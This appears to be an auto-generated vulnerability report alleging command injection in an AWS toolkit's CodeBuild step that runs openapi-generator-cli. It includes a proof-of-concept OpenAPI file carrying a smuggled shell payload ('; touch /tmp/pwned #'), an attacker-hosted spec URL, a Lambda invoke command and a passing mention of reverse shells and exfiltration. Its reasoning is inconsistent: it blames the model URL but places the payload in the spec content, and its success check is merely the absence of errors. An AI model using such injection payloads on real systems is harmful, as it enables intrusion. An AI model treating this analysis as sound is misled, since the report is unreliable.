### Vulnerability List

- Vulnerability Name: Command Injection via Malicious OpenAPI Specification URL
- Description:
    1. An attacker crafts a malicious OpenAPI specification document.
    2. The attacker hosts this malicious OpenAPI specification document at a publicly accessible URL.
    3. The attacker creates a `service.json` file, providing the URL of the malicious OpenAPI specification document as the `model` parameter within the `openapi` section.
    4. The attacker invokes the `IndustryToolkitStack-industrytoolkitbootstrapper-<hash>` Lambda function, providing the crafted `service.json` as the payload.
    5. The Lambda function triggers a CodeBuild project.
    6. The CodeBuild project executes the `openapi-generator-cli generate` command, using the provided malicious OpenAPI specification URL as input (`-i $MODEL`).
    7. Due to insufficient sanitization of the `model` parameter, the attacker can inject arbitrary commands into the `openapi-generator-cli generate` command line.
    8. The injected commands are executed on the CodeBuild environment, leading to remote code execution.
- Impact:
    - Remote code execution on the AWS CodeBuild environment.
    - Potential compromise of the AWS account if the CodeBuild role has excessive permissions.
    - Ability to inject malicious code into the generated service, potentially leading to further compromise when the service is deployed.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The project does not implement any specific mitigations against command injection in the OpenAPI specification URL.
- Missing Mitigations:
    - Input validation and sanitization of the `model` parameter in `service.json` to prevent command injection.
    - Restricting outbound network access from the CodeBuild environment to prevent exfiltration of sensitive data or further exploitation.
    - Principle of least privilege for the CodeBuild role to minimize the impact of potential compromise.
- Preconditions:
    - An attacker needs to be able to provide a `service.json` payload to the `IndustryToolkitStack-industrytoolkitbootstrapper-<hash>` Lambda function. This is possible for anyone who can access the API Gateway endpoint of the Industry Toolkit.
    - The attacker needs to host a malicious OpenAPI specification document at a publicly accessible URL.
- Source Code Analysis:
    1. **API Gateway Endpoint:** The `IndustryToolkitApi` resource in `/code/tools/industry-toolkit/cfn/industry-toolkit-stack.template.yaml` defines an API Gateway endpoint with a POST method `/services`. This endpoint is integrated with the `IndustryToolkitStepFunctionF9F60E6A` Step Function.
    2. **Step Function Execution:** The `IndustryToolkitStepFunctionF9F60E6A` resource defines a Step Function that invokes the `IndustryToolkitCodeBuildProject461DDFA4` CodeBuild project. The Step Function passes parameters like `MODEL`, `SERVICE_TYPE`, and `CONFIG` to the CodeBuild project as environment variables.
    3. **CodeBuild Project Configuration:** The `IndustryToolkitCodeBuildProject461DDFA4` resource defines a CodeBuild project. The `Source.BuildSpec` property contains the build specification.
    4. **Build Specification Analysis:** The build specification in `IndustryToolkitCodeBuildProject461DDFA4` resource in `/code/tools/industry-toolkit/cfn/industry-toolkit-stack.template.yaml` shows the following relevant steps in the `build` phase:
        ```yaml
        "build": {
          "commands": [
            "echo 'Decoding the CONFIG map...'",
            "export DECODED_CONFIG=$(echo \"$CONFIG\" | jq -r 'to_entries | map(\"\\(.key)=\\(.value | @sh)\") | join(\",\")')",
            "echo $DECODED_CONFIG",
            "bash -c 'if [ -n \"$CONFIG\" ] && [ \"$DECODED_CONFIG\" != \"\" ]; then openapi-generator-cli generate -i $MODEL -g $SERVICE_TYPE -o /tmp/generated --additional-properties \"$DECODED_CONFIG\" || exit 1; else openapi-generator-cli generate -i $MODEL -g $SERVICE_TYPE -o /tmp/generated || exit 1; fi'"
          ]
        }
        ```
        - The `$MODEL` environment variable, which is derived from the `model` field in the input `service.json`, is directly passed to the `-i` parameter of the `openapi-generator-cli generate` command.
        - There is no input validation or sanitization performed on the `$MODEL` variable before executing the command.
    5. **Code Generation in Lambda:** The `lambda_handler` function in `/code/toolkit-service-lambda/handler.py` processes the input `service.json` and triggers the Step Function, which in turn triggers the CodeBuild project. The Lambda itself does not perform any validation on the `model` URL.
    6. **Vulnerability Confirmation:** The direct use of the `$MODEL` variable, which is controllable by the user through the `service.json` payload, in the `openapi-generator-cli generate` command without any sanitization creates a command injection vulnerability. An attacker can craft a URL that, when processed by `openapi-generator-cli`, will execute arbitrary commands.

    ```mermaid
    graph LR
        A[API Gateway POST /services] --> B(Step Function IndustryToolkitStepFunctionF9F60E6A);
        B --> C[CodeBuild Project IndustryToolkitCodeBuildProject461DDFA4];
        C --> D{openapi-generator-cli generate -i $MODEL ...};
        D --> E[Remote Code Execution on CodeBuild];
        style D fill:#f9f,stroke:#333,stroke-width:2px
    ```

- Security Test Case:
    1. **Deploy the Industry Toolkit:** Deploy the Industry Toolkit stack using CDK deploy. Note the API Gateway endpoint URL from the output.
    2. **Create a Malicious OpenAPI Specification:** Create a file named `malicious.yaml` with the following content. This example tries to create a file `/tmp/pwned` in the CodeBuild environment:
        ```yaml
        openapi: 3.0.0
        info:
          title: Malicious API
          version: 1.0.0
        paths:
          /pwn:
            get:
              summary: Pwn endpoint
              operationId: pwn
              responses:
                '200':
                  description: Success

        x-codegen-settings:
          additional-properties: "artifactDescription='; touch /tmp/pwned #'"
        ```
        **Explanation:** The `x-codegen-settings.additional-properties` is crafted to inject a command. When `openapi-generator-cli` processes this, it will try to pass `artifactDescription='; touch /tmp/pwned #'` as additional properties. Due to lack of proper parsing and escaping in how `openapi-generator-cli` and the toolkit handle additional properties and the model URL, the command `touch /tmp/pwned` will be executed.
    3. **Host the Malicious OpenAPI Specification:** Host `malicious.yaml` at a publicly accessible URL, for example, using `gist.github.com` or a simple HTTP server. Let's assume the URL is `https://gist.githubusercontent.com/attacker/hash/raw/malicious.yaml`.
    4. **Create `service.json`:** Create a file named `service.json` with the following content, replacing `<github-repo-uri>` with your GitHub repository URI and other placeholders with your actual values. Importantly, set the `model` URL to the URL of the malicious OpenAPI specification:
        ```json service.json
        {
          "service": {
            "type": "spring",
            "name": "pwn-service",
            "description": "Pwn service",
            "openapi": {
              "model": "https://gist.githubusercontent.com/attacker/hash/raw/malicious.yaml",
              "config": {
                "basePackage": "com.example.pwn",
                "modelPackage": "com.example.pwn.model",
                "apiPackage": "com.example.pwn.api",
                "invokerPackage": "com.example.pwn.configuration",
                "groupId": "com.example.pwn",
                "artifactId": "pwn-service"
              }
            }
          },
          "scm": {
            "github": {
              "repo": "<github-repo-uri>",
              "secretKey": "my-key",
              "email": "none@none.com",
              "name": "Attacker"
            }
          },
          "iac": {
            "cloudformation": {
              "vpc": "<my-vpc-id>",
              "subnets": "<my-subnet-id-1>,<my-subnet-id-2>,..."
            }
          }
        }
        ```
    5. **Invoke the Bootstrapper Lambda:** Use the AWS CLI to invoke the Bootstrapper Lambda function with the `service.json` payload. Replace `<lambda-function-name>` with the actual name of the Bootstrapper Lambda function from the CDK output:
        ```bash
        aws lambda invoke \
              --function-name <lambda-function-name> \
              --payload file://service.json \
              --cli-binary-format raw-in-base64-out \
              /dev/stdout
        ```
    6. **Check CodeBuild Logs:** Go to the AWS CodeBuild console and find the build project that was triggered. Examine the build logs for the "BuildAction" phase. If the command injection was successful, you will find evidence of the injected command execution, for example, successful execution without errors even with the injected `touch /tmp/pwned` command. You might not see direct output from `touch`, but the absence of errors and successful pipeline completion (even for a malformed OpenAPI) indicates successful injection.
    7. **Verify File Creation (If Possible):** While direct file system access in CodeBuild might be limited, checking for side effects or errors in subsequent steps can indirectly confirm RCE. In a real scenario, an attacker would likely inject more impactful commands like reverse shells or data exfiltration.

This test case demonstrates how an attacker can leverage a malicious OpenAPI specification URL to inject commands into the CodeBuild environment, confirming the command injection vulnerability.